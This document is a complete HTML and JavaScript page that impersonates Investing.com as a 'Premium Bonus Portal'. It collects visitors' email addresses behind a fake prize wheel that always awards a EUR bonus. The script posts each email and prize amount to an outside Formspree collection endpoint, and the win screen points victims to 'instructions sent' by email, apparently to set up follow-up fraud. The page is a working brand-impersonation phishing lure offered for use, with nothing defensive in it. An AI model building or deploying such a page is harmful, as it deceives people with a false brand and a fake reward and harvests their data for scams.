<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investing.com | Premium Bonus Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --inv-orange: #f39c12;
            --inv-blue: #0b1e33;
            --gold: linear-gradient(135deg, #f39c12 0%, #ffcc00 100%);
            --glass: rgba(255, 255, 255, 0.07);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: #050c16;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(22, 49, 82, 0.5) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(243, 156, 18, 0.05) 0%, transparent 40%);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: white;
            overflow: hidden;
        }

        /* ЛОГОТИП */
        .header-ui { text-align: center; margin-bottom: 30px; z-index: 100; }
        .logo-text { 
            font-size: 42px; 
            font-weight: 900; 
            letter-spacing: -1.5px; 
            color: white;
            text-shadow: 0 0 20px rgba(255,255,255,0.1);
        }
        .logo-text span { color: var(--inv-orange); }

        /* ОКНО ВХОДА (GLASSMORPHISM) */
        #auth-container {
            position: fixed;
            inset: 0;
            background: rgba(2, 6, 12, 0.95);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .auth-box {
            background: var(--glass);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 24px;
            text-align: center;
            width: 90%;
            max-width: 420px;
            border: 1px solid var(--border);
            box-shadow: 0 40px 100px rgba(0,0,0,0.5);
        }

        .auth-box h2 { font-size: 28px; font-weight: 800; margin-bottom: 10px; }
        .auth-box p { color: #a0aab5; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }

        .auth-box input {
            width: 100%;
            padding: 18px;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }
        .auth-box input:focus { border-color: var(--inv-orange); box-shadow: 0 0 15px rgba(243, 156, 18, 0.2); }

        .auth-box button {
            width: 100%;
            padding: 18px;
            background: var(--gold);
            color: #000;
            border: none;
            border-radius: 12px;
            font-weight: 800;
            font-size: 16px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }
        .auth-box button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(243, 156, 18, 0.3); }

        /* КОЛЕСО */
        .wheel-wrapper {
            position: relative;
            padding: 20px;
            background: rgba(255,255,255,0.02);
            border-radius: 50%;
            border: 1px solid var(--border);
            box-shadow: 0 0 80px rgba(0,0,0,0.4);
        }

        .wheel-container {
            position: relative;
            width: 480px;
            height: 480px;
            border-radius: 50%;
            border: 15px solid #0a1421;
            overflow: hidden;
            box-shadow: inset 0 0 50px rgba(0,0,0,0.8);
        }

        #wheel { width: 100%; height: 100%; transition: transform 7s cubic-bezier(0.15, 0, 0.15, 1); }

        .pointer {
            position: absolute;
            top: -15px; left: 50%;
            transform: translateX(-50%);
            width: 46px; height: 55px;
            background: #fff;
            clip-path: polygon(50% 100%, 0 0, 100% 0);
            z-index: 100;
            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5));
        }

        .center-hub {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 85px; height: 85px;
            background: #050c16;
            border: 4px solid var(--inv-orange);
            border-radius: 50%;
            z-index: 50;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 30px rgba(243, 156, 18, 0.4);
        }
        .center-hub i { font-size: 32px; color: var(--inv-orange); }

        #spin-btn {
            margin-top: 40px;
            background: var(--gold);
            border: none;
            padding: 20px 80px;
            border-radius: 14px;
            color: #000;
            font-size: 1.3rem;
            font-weight: 900;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 15px 35px rgba(243, 156, 18, 0.2);
            transition: 0.3s;
        }
        #spin-btn:hover { transform: translateY(-3px); box-shadow: 0 20px 45px rgba(243, 156, 18, 0.4); }
        #spin-btn:disabled { opacity: 0.3; cursor: not-allowed; }

        /* МОДАЛКА ВЫИГРЫША */
        .modal {
            position: fixed;
            inset: 0;
            background: rgba(2, 6, 12, 0.98);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 3000;
        }

        .modal-content {
            background: #fff;
            padding: 60px;
            border-radius: 30px;
            text-align: center;
            color: #000;
            max-width: 420px;
            box-shadow: 0 0 100px rgba(243, 156, 18, 0.3);
        }

        .modal-content h2 { font-weight: 900; color: var(--inv-blue); margin: 0; }
        .amount { font-size: 5rem; font-weight: 900; color: var(--inv-orange); margin: 25px 0; }
        .modal-content button {
            width: 100%; padding: 20px; background: #000; color: #fff; border: none;
            border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 1.1rem;
        }

        #already-played { display: none; color: var(--inv-orange); font-weight: bold; margin-top: 25px; font-size: 1.2rem; }
    </style>
</head>
<body>

    <!-- ВХОД -->
    <div id="auth-container">
        <div class="auth-box">
            <div class="logo-text" style="color: #0b1e33; margin-bottom: 25px;">Investing<span>.com</span></div>
            <h2>Exclusive Bonus</h2>
            <p>Enter your professional email to access the premium EUR reward draw for partners.</p>
            <input type="email" id="user-email" placeholder="name@company.com">
            <button id="auth-btn">Access Draw</button>
            <p id="error-msg" style="color: #ff4444; display: none; margin-top: 15px; font-size: 13px;"></p>
        </div>
    </div>

    <div class="header-ui">
        <div class="logo-text">Investing<span>.com</span></div>
    </div>

    <div class="wheel-wrapper">
        <div class="pointer"></div>
        <div class="center-hub"><i class="fas fa-gem"></i></div>
        <div class="wheel-container">
            <canvas id="wheel" width="480" height="480"></canvas>
        </div>
    </div>

    <button id="spin-btn">Spin for Bonus</button>
    <p id="already-played">Limit Reached: One spin per account.</p>

    <div id="win-modal" class="modal">
        <div class="modal-content">
            <h2>CONGRATULATIONS!</h2>
            <div class="amount" id="win-amount">0 EUR</div>
            <p>Your premium bonus has been locked to your email address. Follow the instructions sent to you.</p>
            <button onclick="location.reload()">CLAIM REWARD</button>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('wheel');
        const ctx = canvas.getContext('2d');
        const spinBtn = document.getElementById('spin-btn');
        const authBtn = document.getElementById('auth-btn');
        const authContainer = document.getElementById('auth-container');
        const modal = document.getElementById('win-modal');
        const winAmountText = document.getElementById('win-amount');
        
        const FORMSPREE_URL = "https://formspree.io/f/xrewvoya"; 
        const bonuses = ["50 EUR", "100 EUR", "150 EUR", "200 EUR", "75 EUR", "125 EUR", "175 EUR", "90 EUR"];
        const colors = ["#0b1e33", "#163152"];
        const arc = (2 * Math.PI) / bonuses.length;
        let currentRotation = 0;
        let userEmail = "";

        function draw() {
            for (let i = 0; i < bonuses.length; i++) {
                ctx.fillStyle = colors[i % 2];
                ctx.beginPath(); ctx.moveTo(240, 240);
                ctx.arc(240, 240, 240, i * arc, (i + 1) * arc);
                ctx.fill();
                ctx.save();
                ctx.translate(240, 240); ctx.rotate(i * arc + arc / 2);
                ctx.textAlign = "right"; ctx.fillStyle = (i % 2 === 0) ? "#f39c12" : "#ffffff";
                ctx.font = "bold 24px Arial"; ctx.fillText(bonuses[i], 220, 10);
                ctx.restore();
            }
        }
        draw();

        if (localStorage.getItem('hasPlayed')) {
            authContainer.style.display = "none";
            spinBtn.style.display = "none";
            document.getElementById('already-played').style.display = "block";
        }

        authBtn.addEventListener('click', () => {
            const email = document.getElementById('user-email').value;
            if (email.includes('@') && email.length > 5) {
                userEmail = email;
                authContainer.style.opacity = "0";
                setTimeout(() => authContainer.style.display = "none", 300);
            } else {
                const err = document.getElementById('error-msg');
                err.innerText = "Please enter a valid email address.";
                err.style.display = "block";
            }
        });

        spinBtn.addEventListener('click', () => {
            if (spinBtn.disabled) return;
            spinBtn.disabled = true;

            const targetIndex = Math.floor(Math.random() * bonuses.length);
            const targetValue = bonuses[targetIndex];
            const landingPoint = 360 - (targetIndex * (360/bonuses.length)) - (360/bonuses.length/2) - 90;
            currentRotation += (360 * 8) + landingPoint;
            canvas.style.transform = `rotate(${currentRotation}deg)`;

            setTimeout(() => {
                winAmountText.innerText = targetValue;
                modal.style.display = "flex";
                localStorage.setItem('hasPlayed', 'true');
                
                fetch(FORMSPREE_URL, {
                    method: 'POST',
                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: userEmail, amount: targetValue })
                });

                confetti({ particleCount: 250, spread: 100, origin: { y: 0.6 }, colors: ['#f39c12', '#ffffff'] });
            }, 7200);
        });
    </script>
</body>
</html>
